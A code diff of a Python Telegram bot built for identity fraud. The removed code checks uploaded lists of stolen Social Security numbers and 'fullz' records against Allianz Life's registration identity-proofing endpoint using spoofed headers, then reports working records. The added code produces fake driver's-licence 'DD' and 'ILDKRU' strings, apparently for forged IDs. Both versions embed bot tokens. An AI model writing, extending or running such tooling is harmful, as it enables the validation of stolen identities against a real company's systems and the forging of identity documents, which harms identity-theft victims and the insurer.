@@ -1,126 +1,110 @@
+import telebot
 import re
-import requests
-from requests import Session
-from telebot import TeleBot
 import random
+import string
 
-bot = TeleBot("6697923951:AAF_cJtJAwr7FxDQHt0cV8AxlG-tskFiU2A")
+API_TOKEN = '7987008476:AAEwU9EiLyRiTX5ctpiy1nBIvxFzNne29KU'  # Replace with your actual Telegram bot token
+bot = telebot.TeleBot(API_TOKEN)
 
-admins = [1971995086,1396561970]
+# List of admin user IDs
+ADMINS = [1396561970, 1971995086, 5084753170]
 
+# Regex patterns for both options
+pattern1 = r'^\d{2}/\d{2}/\d{4}$'  # For a single date input
+pattern2 = r'^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\n\d{2}/\d{2}/\d{4}$'  # For the alphanumeric code + date input
 
+def generate_random_numbers(count):
+    """Generate a string of random digits of specified count."""
+    return ''.join(random.choices(string.digits, k=count))
 
-def check_ssn(ssn:int,full_ssn = False,full = [],pattern = 1,recheck = True):
-    url = "https://www.allianzlife.com/Registration/individual"
-    session = Session()
-    resp = session.get(url)
-    pattern = r'<meta name="page_identifier" content="([^"]+)">'
-    matches = re.findall(pattern, resp.text)
-    page_id = matches[0]
-    headers = {
-    'Host': 'www.allianzlife.com',
-    'Content-Length': '415',
-    'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122")',
-    'Sec-Ch-Ua-Mobile': '?0',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
-    'X-Dtpc': '3$193658394_898h6vPAINECCRUEPPTMRAUGUDPISICBWQPAMG-0e0',
-    'Content-Type': 'application/json; charset=UTF-8',
-    'Accept': 'application/json, text/javascript, */*; q=0.01',
-    'X-Requested-With': 'XMLHttpRequest',
-    'Sec-Ch-Ua-Platform': '"Windows"',
-    'Origin': 'https://www.allianzlife.com',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Dest': 'empty',
-    'Referer': 'https://www.allianzlife.com/Registration/individual',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Priority': 'u=1, i'
-    }
-    data = {
-        "context":"IndividualIdProofing"
-        ,"IndividualIdProofing.FirstName":"Nicko"
-        ,"IndividualIdProofing.MiddleInitial":""
-        ,"IndividualIdProofing.LastName":"Jones"
-        ,"IndividualIdProofing.FULL_SSN_TIN":f"{ssn}"
-        ,"IndividualIdProofing.DateOfBirthMonth":"10"
-        ,"IndividualIdProofing.DateOfBirthDay":"11"
-        ,"IndividualIdProofing.DateOfBirthYear":"2003"
-        ,"chimeraRegisteredPageData":{"pageId":page_id}
-    }
-    if full_ssn == False:
-        response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
-        if "Show error message" in response.text: return False
-        return True
-    else:
-        data["IndividualIdProofing.LastName"] = full[0]
-        if pattern == 2:
-            data["IndividualIdProofing.MiddleInitial"] = full[1]
-            full.pop(1)
-        data["IndividualIdProofing.FirstName"] = full[1]
-        data["IndividualIdProofing.DateOfBirthMonth"] = full[3]
-        data["IndividualIdProofing.DateOfBirthDay"] = full[4]
-        data["IndividualIdProofing.DateOfBirthYear"] = full[5]
-        response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
-        if "fail-existing-account-found" in response.text or not ( "fail-data-mismatch" in response.text or "Show error message" in response.text or "Error" in response.text) :
-            return True
+def generate_random_letters(count):
+    """Generate a string of random uppercase letters of specified count."""
+    return ''.join(random.choices(string.ascii_uppercase, k=count))
+
+def generate_ildkru():
+    """Generate the ILDKRU01 format with random 4 uppercase letters."""
+    return f"IL{generate_random_letters(4)}01"
+
+@bot.message_handler(commands=['start'])
+def start_message(message):
+    bot.send_message(message.chat.id, "Please provide your DD info in one of these formats:\n"
+                                      "1. 09/23/2028\n"
+                                      "2. G610-5059-3893\n05/23/2026")
+
+# Admin check decorator
+def admin_only(func):
+    def wrapper(message):
+        user_id = message.from_user.id
+        if user_id in ADMINS:
+            return func(message)
         else:
-            if recheck : return False
-            else:
-                full[0],full[1] = full[1],full[0]
-                return check_ssn(ssn,full_ssn,full,True)
-        
-def check_format(ssn:str):
-    pattern = r'^([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
-    second_pattern = r'^([^,]+),([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
-    if ssn.isdecimal():
-        return 0
-    elif re.match(pattern,ssn):
-        return 1
-    elif re.match(second_pattern,ssn):
-        return 2
-    else : return -1 #ignore
+            bot.reply_to(message, "🚫 You are not authorized to use this bot.")
+    return wrapper
 
-    
-def save_ssn(ssn:int,name):
-    open(f"succ-{name}.txt",'+a').write(f"{ssn}\n")
+@bot.message_handler(func=lambda message: True)
+def handle_dd_input(message):
+    user_input = message.text.strip()
 
+    # Attempt to match both patterns
+    if re.match(pattern2, user_input):
+        # Handle alphanumeric code + date (Option 2)
+        handle_dd_format2(message, user_input)
+    elif re.match(pattern1, user_input):
+        # Handle just the date (Option 1)
+        handle_dd_format1(message, user_input)
+    else:
+        # Send error message if input doesn't match either format
+        bot.send_message(message.chat.id, "Invalid format! Please make sure the input matches one of the two formats:\n"
+                                          "1. 09/23/2028\n"
+                                          "2. G610-5059-3893\n05/23/2026")
 
-def send_telegam(ssn:int,telegram_id:int):
-    bot.send_message(telegram_id,f"NEW Working Fullz : {ssn}")
-
-
-@bot.message_handler(content_types=['document'])
-def doc_handler(message):
-    successful = 0
-    file_id = message.document.file_id
-    file_info = bot.get_file(file_id)
-    file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}'
-    response = requests.get(file_url)
-    if response.status_code == 200:
-        name = random.randint(0,1000000000000) * random.randint(100,10000000) / random.randint(1,1000)
-        document_content = response.content.decode("utf-8")
-        SSNs = document_content.splitlines()
-        bot.send_message(message.chat.id,"Successfully Received Fullz File")
-        bot.send_message(message.chat.id,f"Checking 🕐... ID : {name}")
-        for ssn in SSNs:
-            format_ = check_format(ssn)
-            if format_ == 0:
-                if check_ssn(ssn):
-                    successful += 1
-                    send_telegam(ssn,message.chat.id)
-                    save_ssn(ssn,name)
-            elif format_ == 1:
-                ssn_ = ssn.split(",")
-                if check_ssn(ssn_[2],True,ssn_):
-                    successful += 1
-                    send_telegam(ssn,message.chat.id)
-                    save_ssn(ssn,name)
+def handle_dd_format1(message, user_input):
+    """Handles the single date input (e.g., 09/23/2028)."""
     try:
-        file = open(f"succ-{name}.txt","r")
-        bot.send_document(message.chat.id,document = file)
-        bot.send_message(message.chat.id,"Done Checking ")
-        bot.send_message(message.chat.id,f"Success : {successful}")
-    except:
-        bot.send_message(message.chat.id,"DONE")
+        # Convert date format from MM/DD/YYYY to YYYYMMDD
+        date_parts = user_input.split('/')
+        formatted_date = f"{date_parts[2]}{date_parts[0]}{date_parts[1]}"
+        
+        # Generate 3 random numbers, 2 random letters, 4 random numbers
+        random_part = f"{generate_random_numbers(3)}{generate_random_letters(2)}{generate_random_numbers(4)}"
+        
+        # Generate ILDKRU01 with random letters
+        ildkru = generate_ildkru()
+        
+        # Construct final output
+        final_output = f"{formatted_date}{random_part}"
+        
+        # Send transformed DD info and ILDKRU string to the user
+        bot.send_message(message.chat.id, f"Transformed DD info:\n{final_output}\nILDKRU: {ildkru}")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"An error occurred while processing your input: {e}")
+
+def handle_dd_format2(message, user_input):
+    """Handles the alphanumeric code + date input (e.g., G610-5059-3893 and 05/23/2026)."""
+    try:
+        # Split the input into the alphanumeric code and the date
+        code, date = user_input.split('\n')
+        
+        # Remove dashes from the alphanumeric code
+        sanitized_code = code.replace("-", "")
+        
+        # Convert date format from MM/DD/YYYY to YYYYMMDD
+        date_parts = date.split('/')
+        formatted_date = f"{date_parts[2]}{date_parts[0]}{date_parts[1]}"
+        
+        # Generate 3 random numbers, 2 random letters, 4 random numbers
+        random_part = f"{generate_random_numbers(3)}{generate_random_letters(2)}{generate_random_numbers(4)}"
+        
+        # Generate ILDKRU01 with random letters
+        ildkru = generate_ildkru()
+        
+        # Construct final output
+        final_output = f"{sanitized_code}\n{formatted_date}{random_part}"
+        
+        # Send transformed DD info and ILDKRU string to the user
+        bot.send_message(message.chat.id, f"Transformed DD info:\n{final_output}\n {ildkru}")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"An error occurred while processing your input: {e}")
+
+# Start polling
 bot.polling()
